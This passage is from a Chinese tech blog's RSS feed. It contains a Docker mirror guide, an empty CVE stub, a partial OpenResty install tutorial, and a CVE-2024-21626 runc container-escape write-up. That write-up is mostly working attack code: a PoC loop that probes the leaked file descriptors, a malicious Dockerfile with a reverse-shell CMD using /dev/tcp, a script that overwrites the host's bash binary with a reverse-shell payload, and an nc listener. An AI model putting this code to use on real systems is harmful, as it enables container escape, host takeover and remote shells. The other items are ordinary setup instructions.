<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tag</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> myimage:latest</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> hub.icert.top/myuser/myrepo:latest</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>推送镜像</h3>
<p>使用 <code>docker push</code> 命令将其推送到私有仓库：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> push</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> hub.icert.top/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">namespac</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">imagenam</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ta</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">g&gt;</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>例如：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> push</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> hub.icert.top/myuser/myrepo:latest</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>这会把标记过的镜像推送到你的私有仓库，然后回到dockerhub检查，镜像已经推送到dockerhub当中去了。</p>
<h2>Docker search命令加速</h2>
<p>近期看到有人用docker search，但是配置了镜像站仍然无法加速搜索。所以我这里新增了Docker hub的search加速。</p>
<p>使用如下方式进行搜索</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> search</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> hub.icert.top/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">search</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> imag</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>例如</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> search</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> hub.icert.top/nginx</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<h2>黑名单</h2>
<p>本站建立的初衷是用于个人学习使用，方便自己也方便别人，近期发现有人滥用，我加功能的时候也写了个防火墙。</p>
<p>有源地址每天请求几万次，经过日志审计我认为是在生产的集群上使用了本加速镜像。我这边的自动程序处理方法是将你的源ip地址自动添加进黑名单，生产使用请联系我捐助解除禁止。</p>
<p>使用本镜像站同步镜像站的滥用行为，请求源ip地址将会被加进黑名单。</p>
<h2>你用的节点在哪里？</h2>
<div class="hint-container info">
<p class="hint-container-title">相关信息</p>
<div id="mobaxterm">
    <iframe style="height:800px" src="https://cloudflare-cloudnative-pages.geekery.cn/docker"></iframe>
</div>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>CVE-2023-32233</title>
      <link>https://www.geekery.cn/note-book/CVE/CVE-2023-32233.html</link>
      <guid>https://www.geekery.cn/note-book/CVE/CVE-2023-32233.html</guid>
      <source url="https://www.geekery.cn/rss.xml">CVE-2023-32233</source>
      <description>CVE-2023-32233 :TODO</description>
      <pubDate>Sat, 03 Feb 2024 06:01:51 GMT</pubDate>
      <content:encoded><![CDATA[
<p>:TODO</p>
]]></content:encoded>
    </item>
    <item>
      <title>CVE-2024-21626利用场景</title>
      <link>https://www.geekery.cn/note-book/CVE/CVE-2024-21626%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF.html</link>
      <guid>https://www.geekery.cn/note-book/CVE/CVE-2024-21626%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF.html</guid>
      <source url="https://www.geekery.cn/rss.xml">CVE-2024-21626利用场景</source>
      <description>CVE-2024-21626利用场景 影响组件 runc是一个根据OCI规范，在Linux上生成和运行容器的命令行工具。runc的使用非常灵活，可以与各种容器工具和平台集成，如Docker、Kubernetes等。它支持多种容器格式，包括OCI规范定义的标准格式，以及其他格式如Docker镜像格式。作为开源项目，runc受到全球开发者社区的广泛参与和贡...</description>
      <pubDate>Thu, 01 Feb 2024 07:53:21 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>影响组件</h2>
<p>runc是一个根据OCI规范，在Linux上生成和运行容器的命令行工具。runc的使用非常灵活，可以与各种容器工具和平台集成，如Docker、Kubernetes等。它支持多种容器格式，包括OCI规范定义的标准格式，以及其他格式如Docker镜像格式。作为开源项目，runc受到全球开发者社区的广泛参与和贡献，被广泛应用于生产环境中的容器化部署。</p>
<h2>漏洞描述</h2>
<p>近日，奇安信CERT监测到runc官方发布安全通告修复了<strong>runc容器逃逸漏洞(CVE-2024-21626)</strong>，由于runc存在内部文件描述符泄露，本地攻击者可以通过多种方式进行容器逃逸：</p>
<p>1、由于runc 内部意外地将包括宿主机 /sys/fs/cgroup 句柄的几个文件描述符泄漏到 runc init 中，攻击欺骗具有特权的用户执行恶意容器镜像，可以导致pid1 进程将在宿主机挂载命名空间中拥有一个工作目录，生成的进程可以访问整个宿主文件系统。</p>
<p>2、由于runc exec中同样存在文件描述符泄漏和工作目录验证不足。如果容器内的恶意进程知道某个管理进程将使用 --cwd 参数和给定路径调用 runc exec，便可以用符号链接将该路径替换为 /proc/self/fd/7/ 。一旦容器进程执行了容器镜像中的可执行文件，可以绕过PR_SET_DUMPABLE 保护，之后攻击者可以通过打开 /proc/$exec_pid/cwd 来访问主机文件系统。</p>
<p>3、可以通过将类似/proc/self/fd/7/../../../bin/bash的路径用作 process.args 二进制参数来覆盖主机二进制文件来改进攻击1、2。由于可以覆盖类似 /bin/bash的二进制文件，一旦特权用户在主机上执行目标二进制文件，攻击者就可以进行转移，以完全访问主机。</p>
<h2>爆出漏洞的fd脚本</h2>
<p>若哪个fd存在漏洞，则这个脚本会显示出来你宿主机的hostname，这个fd要记录下来填到下面的Dockerfile里</p>
<blockquote>
<p>https://github.com/Wall1e/CVE-2024-21626-POC/blob/main/poc.sh</p>
</blockquote>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#! /bin/bash</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">for</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> i</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD"> in</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> {</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">4..20}</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">do</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -it</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --rm</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -w</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /proc/self/fd/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">$i</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ubuntu:20.04</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bash</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -c</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "cat /proc/self/cwd/../../../etc/hostname"</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">done</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>恶意Dockerfile</h2>
<div class="language-dockerfile line-numbers-mode" data-highlighter="shiki" data-ext="dockerfile" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">FROM</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> ubuntu:18.04</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">WORKDIR</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> /proc/1/fd/7/</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h2>构建Dockerfile</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> build</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> .</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> dockerid</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ls</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   ../../../</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> dockerid</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cat</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /proc/1/cwd/../../../../etc/hostname</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>反弹shell</h2>
<p>对于业务来说，给一个上面的恶意镜像</p>
<p>然后可以加一个CMD 反弹shell</p>
<div class="language-dockerfile line-numbers-mode" data-highlighter="shiki" data-ext="dockerfile" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">FROM</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> ubuntu:18.04</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">WORKDIR</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> /proc/1/fd/7/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">CMD</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> /bin/bash -c </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'bash -i &gt;&amp;/dev/tcp/ip/8000 0&gt;&amp;1'</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>给宿主机植入shell</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#!/bin/bash</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">ip</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">$(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">hostname</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -I</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">awk</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '{print $1}'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">port</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">1337</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">cat</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/proc/self/cwd/../../../../bin/bash.copy</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &lt;&lt; </span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">EOF</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">#!/bin/bash</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">bash -i &gt;&amp; /dev/tcp/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">$ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">$port</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 0&gt;&amp;1</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">EOF</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># listen and wait for reverse shell</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nc</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -lvvp</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1337</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>控制WROKERDIR</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">runc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> exec</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --cwd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /proc/1/fd/7/</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> demo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ls</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ../../../../</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>有些产品可以指定 WROKERDIR 也就是 cwd 那么也受影响,可以关注一下启动时候的参数 能不能控制WROKERDIR</p>
]]></content:encoded>
    </item>
    <item>
      <title>Ubuntu安装OpenResty教程</title>
      <link>https://www.geekery.cn/note-book/Nginx-OpenResty/Ubuntu%E5%AE%89%E8%A3%85OpenResty%E6%95%99%E7%A8%8B.html</link>
      <guid>https://www.geekery.cn/note-book/Nginx-OpenResty/Ubuntu%E5%AE%89%E8%A3%85OpenResty%E6%95%99%E7%A8%8B.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Ubuntu安装OpenResty教程</source>
      <description>Ubuntu安装OpenResty教程 参考链接： https://blog.openresty.com.cn/cn/ubuntu20-or-install/ 适合于Ubuntu各个版本，并非只有20.04。都可以被成功an&amp;apos;z 今天我想演示一下如何通过 apt-get 在 Ubuntu 20.04 上安装 OpenResty 。 截图 1 我们将在这...</description>
      <pubDate>Tue, 23 Jan 2024 04:20:43 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>参考链接： https://blog.openresty.com.cn/cn/ubuntu20-or-install/</p>
<p>适合于Ubuntu各个版本，并非只有20.04。都可以被成功an'z</p>
</blockquote>
<p>今天我想演示一下如何通过 <code>apt-get</code> 在 Ubuntu 20.04 上安装 OpenResty 。</p>
<p></p>
<p>我们将在这个视频中使用这个全新安装的 Ubuntu 20.04 。</p>
<p>我们可以到 <a href="http://openresty.org/cn/linux-packages.html#ubuntu" target="_blank" rel="noopener noreferrer">openresty.org 网站</a>上找到相关的说明，这里可以找到所有启用 APT 仓库和安装 OpenResty Deb 包的命令。</p>
<p></p>
<p>回到我们的 Ubuntu 20.04 系统。如果你已经有服务监听本地 80 端口，那么你应该先禁用它。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lsof</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -i:80</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>在这里，我们没有任何这样的服务。</p>
<p>首先，要确保系统时间正确。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ntpdate</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -v</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> time.google.com</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>你可能想在这里使用你附近的其他 NTP 服务器。</p>
<p>我们应该通过添加 GPG 公钥来安装一些需要的组件。这些可以在之后删除。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> apt-get</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -y</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --no-install-recommends</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> wget</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> gnupg</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ca-certificates</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>然后导入我们的 GPG 密钥。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">wget</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -O</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> https://openresty.org/package/pubkey.gpg</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> apt-key</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>接着添加我们的官方 APT 库。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "deb http://openresty.org/package/ubuntu $(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lsb_release</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -sc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">) main"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">openresty.list</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cp</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> openresty.list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/apt/sources.list.d/</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p></p>
<p>请注意，这是针对 <code>x86_64</code> 或 <code>amd64</code> 系统的。</p>
<p>对于 Aarch64 或 ARM64 系统，你应该使用这个 URL 来代替。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "deb http://openresty.org/package/arm64/ubuntu $(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lsb_release</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -sc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">) main"</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>现在更新 APT 索引。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> apt-get</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> update</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>请注意，这里我们需要 <code>sudo</code>。</p>
<p>现在是时候安装我们的主要 RPM 包，<code>openresty</code>。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> apt-get</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -y</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --no-install-recommends</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> openresty</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>检查 <code>openresty</code> 可执行文件是否可用。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">which</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> openresty</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>这个 <code>openresty</code> 可执行文件只是一个符号链接。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">file</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> `</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">which</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> openresty`</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>并检查其版本。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">openresty</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -V</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>我们可以像这样启动默认的 openresty 服务。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> start</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> openresty</span></span></code></pre>
